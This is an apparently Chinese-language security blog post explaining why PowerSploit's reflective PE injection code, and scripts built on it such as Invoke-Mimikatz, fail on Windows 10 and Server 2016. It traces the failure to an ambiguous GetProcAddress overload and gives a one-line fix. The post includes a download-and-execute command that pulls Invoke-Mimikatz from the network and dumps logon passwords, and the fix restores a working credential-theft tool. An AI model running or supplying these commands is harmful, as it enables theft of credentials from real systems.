---
title: "powersploit中多个脚本在windows10和server2016上报错"  # 文章标题
date: 2018-07-15T14:30:00+08:00  # 文章创建日期
draft: false  # 是否为草稿，true 表示草稿，不会在网站上显示
author: "runshell"  # 文章作者
description: "报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。"  # 文章描述
tags: ["powersploit"]  # 文章标签
categories: ["网络安全"]  # 文章分类
---


报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。  
* 错误信息如下:

```powershell
PS C:\WINDOWS\system32> iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShe
llMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::lo
gonPasswords full"'
使用“1”个参数调用“GetMethod”时发生异常:“发现不明确的匹配。”
所在位置 行:886 字符: 6
+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : AmbiguousMatchException

不能对 Null 值表达式调用方法。
所在位置 行:893 字符: 6
+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) []，RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull

找不到“GetDelegateForFunctionPointer”的重载，参数计数为:“2”。
所在位置 行:489 字符: 3
+         $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::Get ...
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodCountCouldNotFindBest
.............
...省略n行...
.............
```
* [解决方法](https://github.com/PowerShellMafia/PowerSploit/issues/293)：
```
请尝试更改该行：
$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
至
$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
```
* 报错分析：  

报错的第886行代码为`$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')`,它存在如下函数中：
```powershell
#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
		$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
		# $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
```

该行代码由于在执行$UnsafeNativeMethods.GetMethod('GetProcAddress')的时候，$UnsafeNativeMethods有两个方法名都是GetProcAddress，显然是方法的重载，所以GetMethod('GetProcAddress')无法确定返回哪个方法，所以出现错误。powershell和其他shell一样，代码执行出错抛出异常后会继续执行后面的代码。它不像python、php这些脚本语言，抛出异常后会终止程序。所以后面的报错是因为第一个错误产生的。  

以下是$UnsafeNativeMethods.GetMethod('GetProcAddress')的两个可能的值，必须想办法让它确定下来，方法之一则是“暂时解决办法”提到的那样。
```
Name                       : GetProcAddress
DeclaringType              : Microsoft.Win32.UnsafeNativeMethods
ReflectedType              : Microsoft.Win32.UnsafeNativeMethods
MemberType                 : Method
MetadataToken              : 100663839
Module                     : System.dll
IsSecurityCritical         : True
IsSecuritySafeCritical     : True
IsSecurityTransparent      : False
MethodHandle               : System.RuntimeMethodHandle
Attributes                 : PrivateScope, Public, Static, HideBySig, PinvokeImpl
CallingConvention          : Standard
ReturnType                 : System.IntPtr
ReturnTypeCustomAttributes : IntPtr
ReturnParameter            : IntPtr
IsGenericMethod            : False
IsGenericMethodDefinition  : False
ContainsGenericParameters  : False
MethodImplementationFlags  : PreserveSig
IsPublic                   : True
IsPrivate                  : False
IsFamily                   : False
IsAssembly                 : False
IsFamilyAndAssembly        : False
IsFamilyOrAssembly         : False
IsStatic                   : True
IsFinal                    : False
IsVirtual                  : False
IsHideBySig                : True
IsAbstract                 : False
IsSpecialName              : False
IsConstructor              : False
CustomAttributes           : {[System.Runtime.InteropServices.DllImportAttribute("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = 2, ExactSpelling = True, SetLastError = True, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}

Name                       : GetProcAddress
DeclaringType              : Microsoft.Win32.UnsafeNativeMethods
ReflectedType              : Microsoft.Win32.UnsafeNativeMethods
MemberType                 : Method
MetadataToken              : 100663864
Module                     : System.dll
IsSecurityCritical         : True
IsSecuritySafeCritical     : True
IsSecurityTransparent      : False
MethodHandle               : System.RuntimeMethodHandle
Attributes                 : PrivateScope, Public, Static, HideBySig, PinvokeImpl
CallingConvention          : Standard
ReturnType                 : System.IntPtr
ReturnTypeCustomAttributes : IntPtr
ReturnParameter            : IntPtr
IsGenericMethod            : False
IsGenericMethodDefinition  : False
ContainsGenericParameters  : False
MethodImplementationFlags  : PreserveSig
IsPublic                   : True
IsPrivate                  : False
IsFamily                   : False
IsAssembly                 : False
IsFamilyAndAssembly        : False
IsFamilyOrAssembly         : False
IsStatic                   : True
IsFinal                    : False
IsVirtual                  : False
IsHideBySig                : True
IsAbstract                 : False
IsSpecialName              : False
IsConstructor              : False
CustomAttributes           : {[System.Runtime.InteropServices.DllImportAttribute("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = 2, ExactSpelling = False, SetLastError = False, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}
```
